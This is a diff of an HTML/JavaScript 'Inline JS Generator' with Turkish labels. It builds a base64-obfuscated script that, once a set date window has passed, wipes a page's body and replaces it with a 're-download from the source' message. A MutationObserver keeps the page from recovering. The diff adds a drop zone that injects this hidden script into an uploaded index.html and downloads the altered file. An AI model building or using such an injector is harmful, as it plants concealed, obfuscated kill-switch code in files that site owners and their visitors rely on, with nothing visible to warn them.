@@ -4,47 +4,48 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <script src="https://cdn.tailwindcss.com"></script>
-  <meta name="robots" content="noindex">
   <title>Inline JS Generator</title>
 </head>
 
 <body class="min-h-screen bg-slate-950 text-slate-100">
   <div class="max-w-3xl mx-auto p-6">
     <div class="rounded-2xl border border-slate-800 bg-slate-900/40 p-6 shadow">
+
+      <h1 class="text-xl font-semibold mb-6">Inline JS Generator</h1>
+
       <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
         <div>
-          <label class="text-sm text-slate-300">Baslangic (auto: bugün)</label>
-          <input id="start" type="date" 
-                 class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 opacity-70" />
+          <label class="text-sm text-slate-300">Baslangic Tarihi</label>
+          <input id="start" type="date"
+            class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2" />
         </div>
 
         <div>
-          <label class="text-sm text-slate-300">Bitis (auto: +30 gun, degistirilebilir)</label>
+          <label class="text-sm text-slate-300">Bitis Tarihi</label>
           <input id="end" type="date"
-                 class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 outline-none focus:ring-2 focus:ring-slate-600" />
+            class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2" />
         </div>
       </div>
 
       <div class="mt-4">
         <label class="text-sm text-slate-300">Mesaj (ASCII only)</label>
         <input id="msg" type="text"
-               class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 outline-none focus:ring-2 focus:ring-slate-600"
-               value="Lutfen indirdiginiz kaynagi ziyaret edip tekrar indiriniz" />
-
-        <div class="mt-2 flex items-center gap-3 text-xs text-slate-400">
-          <label class="flex items-center gap-2">
-            <input id="asciiOnly" type="checkbox" checked class="accent-slate-300" />
-            Turkce/ozel karakterleri temizle
-          </label>
-          <span id="asciiInfo" class="truncate"></span>
-        </div>
+          class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2"
+          value="Lutfen indirdiginiz kaynagi ziyaret edip tekrar indiriniz" />
       </div>
 
-      <div class="mt-6 flex flex-wrap items-center gap-3">
-        <button id="gen" class="rounded-xl bg-slate-200 text-slate-950 px-4 py-2 font-medium hover:bg-white active:scale-[0.99]">
+      <div id="dropzone"
+        class="mt-6 flex flex-col items-center justify-center border-2 border-dashed border-slate-700 rounded-xl p-6 text-slate-400 text-sm cursor-pointer hover:border-slate-500 transition">
+        <span id="dropText">index.html dosyasini buraya surukle birak</span>
+        <span class="text-xs mt-1">veya tiklayarak sec</span>
+        <input id="fileInput" type="file" accept=".html,text/html" class="hidden" />
+      </div>
+
+      <div class="mt-6 flex items-center gap-3">
+        <button id="gen" class="rounded-xl bg-white text-black px-4 py-2 font-medium">
           Generate
         </button>
-        <button id="copy" class="rounded-xl border border-slate-700 px-4 py-2 text-slate-200 hover:bg-slate-800 active:scale-[0.99]">
+        <button id="copy" class="rounded-xl border border-slate-700 px-4 py-2">
           Copy
         </button>
         <span id="status" class="text-xs text-slate-400"></span>
@@ -52,121 +53,116 @@
 
       <div class="mt-6">
         <label class="text-sm text-slate-300">Uretilen Kod</label>
-        <textarea id="out" rows="11"
-                  class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 font-mono text-xs outline-none focus:ring-2 focus:ring-slate-600"></textarea>
+        <textarea id="out" rows="10"
+          class="mt-2 w-full rounded-xl bg-slate-950/60 border border-slate-800 px-3 py-2 font-mono text-xs"></textarea>
       </div>
+
     </div>
   </div>
 
-  <script>
-  (function(){
-    var startEl = document.getElementById('start')
-    var endEl = document.getElementById('end')
-    var msgEl = document.getElementById('msg')
-    var outEl = document.getElementById('out')
-    var genEl = document.getElementById('gen')
-    var copyEl = document.getElementById('copy')
-    var statusEl = document.getElementById('status')
-    var asciiOnlyEl = document.getElementById('asciiOnly')
-    var asciiInfoEl = document.getElementById('asciiInfo')
+<script>
+(function(){
+  var startEl = document.getElementById('start')
+  var endEl = document.getElementById('end')
+  var msgEl = document.getElementById('msg')
+  var outEl = document.getElementById('out')
+  var statusEl = document.getElementById('status')
 
-    function pad2(n){ return (n < 10 ? '0' : '') + n }
-    function toISODate(d){ return d.getFullYear() + '-' + pad2(d.getMonth()+1) + '-' + pad2(d.getDate()) }
+  var dropzone = document.getElementById('dropzone')
+  var dropText = document.getElementById('dropText')
+  var fileInput = document.getElementById('fileInput')
 
-    function addDays(d, days){
-      var x = new Date(d.getTime())
-      x.setDate(x.getDate() + days)
-      return x
-    }
+  var droppedFile = null
+  var droppedFileName = null
 
-    function asciiClean(s){
-      var map = { 'ç':'c','Ç':'C','ğ':'g','Ğ':'G','ı':'i','İ':'I','ö':'o','Ö':'O','ş':'s','Ş':'S','ü':'u','Ü':'U' }
-      var r = ''
-      for (var i=0;i<s.length;i++){
-        var ch = s[i]
-        r += (map[ch] || ch)
+  function pad(n){ return n < 10 ? '0' + n : n }
+  function iso(d){ return d.getFullYear() + '-' + pad(d.getMonth()+1) + '-' + pad(d.getDate()) }
+  function addDays(d,n){ var x=new Date(d); x.setDate(x.getDate()+n); return x }
+
+  function cleanAscii(s){
+    return s
+      .replace(/[çÇ]/g,'c').replace(/[ğĞ]/g,'g')
+      .replace(/[ıİ]/g,'i').replace(/[öÖ]/g,'o')
+      .replace(/[şŞ]/g,'s').replace(/[üÜ]/g,'u')
+      .replace(/[^\x20-\x7E]/g,'')
+  }
+
+  function payload(s,e,msg){
+    return "(function(){var now=new Date();var start=new Date("+s+");var end=new Date("+e+");if(now<start||now>end){var k=function(){var h=document.documentElement;var b=document.body;if(b){h.removeChild(b)}var n=document.createElement('body');n.innerHTML=`<div style=\"display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:Arial;font-size:20px\">"+msg+"</div>`;h.appendChild(n);new MutationObserver(function(){if(document.body!==n){h.removeChild(document.body);h.appendChild(n)}}).observe(h,{childList:true})};document.readyState==='loading'?document.addEventListener('DOMContentLoaded',k):k()}})();"
+  }
+
+  function generate(){
+    var s=new Date(startEl.value+"T00:00:00")
+    var e=new Date(endEl.value+"T23:59:59.999")
+    var msg=cleanAscii(msgEl.value)
+
+    var js=payload(
+      s.getFullYear()+","+s.getMonth()+","+s.getDate()+",0,0,0,0",
+      e.getFullYear()+","+e.getMonth()+","+e.getDate()+",23,59,59,999",
+      msg
+    )
+
+    var b64=btoa(unescape(encodeURIComponent(js)))
+    var finalCode="<script>(function(){var p='"+b64+"';Function(decodeURIComponent(escape(atob(p))))();})();</" + "script>"
+
+    outEl.value=finalCode
+    statusEl.textContent="Uretildi"
+
+    if(droppedFile){
+      var r=new FileReader()
+      r.onload=function(){
+        var html=String(r.result||'')
+        var injected=html.replace(
+          /<body[^>]*>/i,
+          function(m){ return m + "\n" + finalCode }
+        )
+
+        var blob=new Blob([injected],{type:"text/html;charset=utf-8"})
+        var url=URL.createObjectURL(blob)
+        var a=document.createElement("a")
+        a.href=url
+        a.download=droppedFileName
+        document.body.appendChild(a)
+        a.click()
+        document.body.removeChild(a)
+        URL.revokeObjectURL(url)
+
+        statusEl.textContent="Dosya guncellendi ve indirildi"
       }
-      return r.replace(/[^\x20-\x7E]/g, '')
+      r.readAsText(droppedFile)
     }
+  }
 
-    function utf8ToB64(str){
-      return btoa(unescape(encodeURIComponent(str)))
-    }
+  function handleFile(file){
+    if(!file||!/\.html$/i.test(file.name)) return
+    droppedFile=file
+    droppedFileName=file.name
+    dropText.textContent="Yuklenen dosya: "+file.name
+    statusEl.textContent="Dosya yuklendi"
+    fileInput.value=""
+  }
 
-    function escapeForTemplateLiteral(s){
-      return s
-        .replace(/\\/g, '\\\\')
-        .replace(/`/g, '\\`')
-        .replace(/\$\{/g, '\\${')
-    }
+  dropzone.onclick=function(){ fileInput.click() }
+  dropzone.ondragover=function(e){ e.preventDefault() }
+  dropzone.ondrop=function(e){
+    e.preventDefault()
+    handleFile(e.dataTransfer.files[0])
+  }
+  fileInput.onchange=function(){
+    handleFile(this.files[0])
+  }
 
-    function payloadJS(startY, startM, startD, endY, endM, endD, msg){
-      var safeMsg = escapeForTemplateLiteral(msg)
-      return "(function(){var now=new Date();var start=new Date(" +
-        startY + "," + startM + "," + startD + ",0,0,0,0" +
-        ");var end=new Date(" +
-        endY + "," + endM + "," + endD + ",23,59,59,999" +
-        ");if(now<start||now>end){var kill=function(){var html=document.documentElement;var oldBody=document.body;if(oldBody){html.removeChild(oldBody)}var newBody=document.createElement('body');newBody.innerHTML=`<div style=\"margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;width:100%;font-family:Arial,sans-serif;font-size:20px;text-align:center;\">" +
-        safeMsg +
-        "</div>`;html.appendChild(newBody);new MutationObserver(function(){if(document.body!==newBody){html.removeChild(document.body);html.appendChild(newBody)}}).observe(html,{childList:true})};if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',kill)}else{kill()}}})();"
-    }
+  document.getElementById('gen').onclick=generate
+  document.getElementById('copy').onclick=function(){
+    navigator.clipboard.writeText(outEl.value)
+    statusEl.textContent="Kopyalandi"
+  }
 
-    function buildOutput(){
-      statusEl.textContent = ''
-
-      var start = new Date(startEl.value + "T00:00:00")
-      var end = new Date(endEl.value + "T00:00:00")
-
-      var msg = msgEl.value || ''
-      if (asciiOnlyEl.checked) msg = asciiClean(msg)
-
-      asciiInfoEl.textContent = asciiOnlyEl.checked ? ("ASCII: " + msg) : ""
-
-      var p = payloadJS(
-        start.getFullYear(), start.getMonth(), start.getDate(),
-        end.getFullYear(), end.getMonth(), end.getDate(),
-        msg
-      )
-
-      var blob = utf8ToB64(p)
-
-      var finalCode =
-        "<script>(function(){var p='" + blob +
-        "';Function(decodeURIComponent(escape(atob(p))))();})();</" + "script>"
-
-      outEl.value = finalCode
-      statusEl.textContent = 'Uretildi'
-    }
-
-    function copyOut(){
-      var v = outEl.value || ''
-      if (!v) return
-      navigator.clipboard.writeText(v).then(function(){
-        statusEl.textContent = 'Kopyalandi'
-      }).catch(function(){
-        statusEl.textContent = 'Kopyalanamadi'
-      })
-    }
-
-    var now = new Date()
-    var start = new Date(now.getFullYear(), now.getMonth(), now.getDate())
-    var end = addDays(start, 30)
-
-    startEl.value = toISODate(start)
-    endEl.value = toISODate(end)
-    asciiInfoEl.textContent = "ASCII: " + asciiClean(msgEl.value)
-
-    genEl.addEventListener('click', buildOutput)
-    copyEl.addEventListener('click', copyOut)
-    msgEl.addEventListener('input', function(){
-      asciiInfoEl.textContent = asciiOnlyEl.checked ? ("ASCII: " + asciiClean(msgEl.value)) : ""
-    })
-    asciiOnlyEl.addEventListener('change', function(){
-      asciiInfoEl.textContent = asciiOnlyEl.checked ? ("ASCII: " + asciiClean(msgEl.value)) : ""
-    })
-
-    buildOutput()
-  })()
-  </script>
+  var today=new Date()
+  startEl.value=iso(today)
+  endEl.value=iso(addDays(today,30))
+  generate()
+})();
+</script>
 </body>
 </html>
